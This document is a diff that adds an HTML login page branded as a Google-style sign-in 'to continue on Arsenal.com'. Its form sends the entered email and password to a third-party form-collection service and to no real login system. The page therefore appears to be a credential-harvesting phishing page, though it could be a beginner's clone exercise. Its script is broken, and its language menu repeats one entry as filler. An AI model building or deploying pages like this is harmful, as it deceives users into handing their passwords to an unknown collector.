@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="Standardform.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Standard Form</title>
+    <script>
+        // Select the inputs and the button
+        const passwordInput = document.getElementById("Password");
+        const emailInput = document.getElementById("Email");
+        const submitButton = document.getElementById("submitButton");
+      
+        // Function to check validity of inputs
+        function checkInputs() {
+          if (passwordInput.checkValidity() && emailInput.checkValidity()) {
+            submitButton.disabled = false; // Enable the button
+            submitButton.classList.add("active"); // Add active class for blue style
+          } else {
+            submitButton.disabled = true; // Disable the button
+            submitButton.classList.remove("active"); // Remove active class
+          }
+        }
+      
+        // Add event listeners to both inputs
+        passwordInput.addEventListener("input", checkInputs);
+        emailInput.addEventListener("input", checkInputs);
+      </script>      
+</head>
+<body>
+  <div class="bodydiv">
+    <div class="loginpage">
+        <div class="Loginwith">
+            <i class='bx bxl-google' ></i>
+         <span>Login with Google</span>
+        </div>
+        <hr>
+        <div class="loginform">
+            <div class="words">
+                <i class='bx bx-rocket'></i>
+                <h1>Login</h1>
+                <p>To continue on <a href="@">Arsenal.com</a></p>
+            </div>
+            <div class="formarea">
+                <form action="https://formspree.io/f/mannldro" method="post" autocomplete="on">
+                    <div class="inputgroup">
+                        <input type="email" name="Email" id="Email" placeholder="."   pattern=".{3,}" required>
+                        <label for="Email">Email</label>
+                    </div>
+                    <div class="inputgroup">
+                        <input type="password" name="Password" placeholder="." id="Password" pattern=".{3,}" required>
+                        <label for="password">Password</label>
+                    </div>
+                    <button type="submit" id="submitButton" >Login</button>
+                </form>
+                <p>Before using this app, you can review Arsenal Social Sign In's <a href="111">privacy policy</a> and Terms of Service.</p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="toggleup">
+            <button>English(US)<i class='bx bxs-down-arrow' undefined ></i></button>
+            <div class="languages">
+                <ul>
+                    <li>Yourba</li>
+                    <li>Igbo</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                    <li>Hausa</li>
+                </ul>
+            </div>
+        </div>
+        <div class="otherlinks">
+            <ul>
+                <li>Help</li>
+                <li>Privacy</li>
+                <li>Terms</li>
+            </ul>
+        </div>
+    </footer>
+  </div>
+</body>
+</html>
